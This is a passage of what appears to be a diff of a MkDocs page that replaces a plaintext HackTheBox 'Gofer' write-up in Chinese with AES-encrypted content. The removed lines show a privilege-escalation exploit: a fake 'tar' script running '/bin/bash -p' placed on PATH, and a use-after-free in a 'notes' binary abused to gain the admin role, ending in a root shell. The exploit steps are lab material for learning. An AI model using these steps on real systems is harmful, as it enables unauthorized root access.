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</div>
+<div id="mkdocs-decrypted-content">
+    <form id="mkdocs-decrypt-form" class="md-content__inner md-typeset">
+        <h1>This content is protected with AES encryption. </h1>
+        <p>Contact your administrator for access to this page.</p>
+        <input class="md-input" type="password" id="mkdocs-content-password" placeholder="Password" />
+        
+        <p id="mkdocs-decrypt-msg"></p>
+    </form>
+</div>
 
-Choose an username: 12345678901234567890123admin
+<script type="text/javascript">
+var encryptcontent_id = "encryptcontent_1";
+var encryptcontent_path = "write-up/HackTheBox/Machines/Gofer/";
+var decryption_failure_message = "Invalid password.";
+var encryptcontent_keystore = ["k4JBGRqzemHNA96yZ31Zzg==;HaGHJ4qA8PZ2maGJ2luE3Pv7lh6FvLOmvLi3H2hZL6F+QNx0vENlwS+A6TNM3zZfAnj7RAFGi9N1lzxtdcBZKoeuOtiu3L+FTqxa3x7FMx+TGAdTBo305KG0ZctKTyjX;38PlOKb1krn1jrDh29Xalg=="];
+var encryptcontent_obfuscate = 0;
 
-========================================
-1) Create an user and choose an username
-2) Show user information
-3) Delete an user
-4) Write a note
-5) Show a note
-6) Save a note (not yet implemented)
-7) Delete a note
-8) Backup notes
-9) Quit
-========================================
+</script>
 
-
-Your choice: 8
-
-Access denied: you don&#39;t have the admin role!
-</code></pre></div>
-<p>失败了，再次分析，发现 <code>case 1</code> 中仅仅给 s 分配了 24 字节，进一步观察发现 <code>case 4</code>会申请 40 个字节，同时 <code>case 3</code> 会释放掉 s 变量的内存，因此可以先释放 s 内存，再在 <code>case 4</code>申请新变量的内存，即可在原内存范围内写入数据，此时的 <code>case 8</code> 也可以获取到变量 s 在释放之前的内存区域，攻击流程：</p>
-<ol>
-<li>编辑 <code>/tmp/tmp/tar</code></li>
-</ol>
-<div class="language-text highlight"><pre><span></span><code>#!/bin/bash
-/bin/bash -p
-</code></pre></div>
-<ol>
-<li>设置环境变量及权限</li>
-</ol>
-<div class="language-text highlight"><pre><span></span><code>chmod +x /tmp/tmp/tar
-export PATH=/tmp/tmp:$PATH
-</code></pre></div>
-<ol>
-<li>执行 notes</li>
-</ol>
-<div class="language-text highlight"><pre><span></span><code>/usr/local/bin/notes
-# 选择 1
-# 输入 24 位垃圾数据 + admin
-123456789012345678901234admin
-# 选择 2 查看 role 是否为 admin
-# 选择 3
-# 选择 4
-# 输入 24 位垃圾数据 + admin
-123456789012345678901234admin
-# 选择 2 查看 role 是否为 admin
-# 选择 8
-</code></pre></div>
-<h3 id="get-roottxt">Get root.txt</h3>
-<p><img alt="image-20231029041235113" src="../assets/202310290412154.png" /></p>
-<div class="language-text highlight"><pre><span></span><code>========================================
-1) Create an user and choose an username
-2) Show user information
-3) Delete an user
-4) Write a note
-5) Show a note
-6) Save a note (not yet implemented)
-7) Delete a note
-8) Backup notes
-9) Quit
-========================================
-Your choice: 1
-
-Choose an username: 123456789012345678901234admin
-========================================
-Your choice: 2
-
-Username: 12345678901234567890123
-Role: user
-========================================
-Your choice: 3
-========================================
-Your choice: 4
-
-Write your note:
-123456789012345678901234admin
-========================================
-Your choice: 2
-
-Username: 123456789012345678901234admin
-Role: admin
-========================================
-Your choice: 8
-
-Access granted!
-/bin/bash: warning: setlocale: LC_ALL: cannot change locale (en_US.UTF-8)
-bash: warning: setlocale: LC_ALL: cannot change locale (en_US.UTF-8)
-root@gofer:~#
-</code></pre></div>
-<p><img alt="image-20231029041453387" src="../assets/202310290414435.png" /></p>
+<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/core.js"></script>
+<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/enc-base64.js"></script>
+<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/cipher-core.js"></script>
+<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/sha256.js"></script>
+<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/hmac.js"></script>
+<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/pbkdf2.js"></script>
+<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/aes.js"></script>
+<script type="text/javascript" src="../../../assets/javascripts/decrypt-contents.js" defer></script>
 
 
 
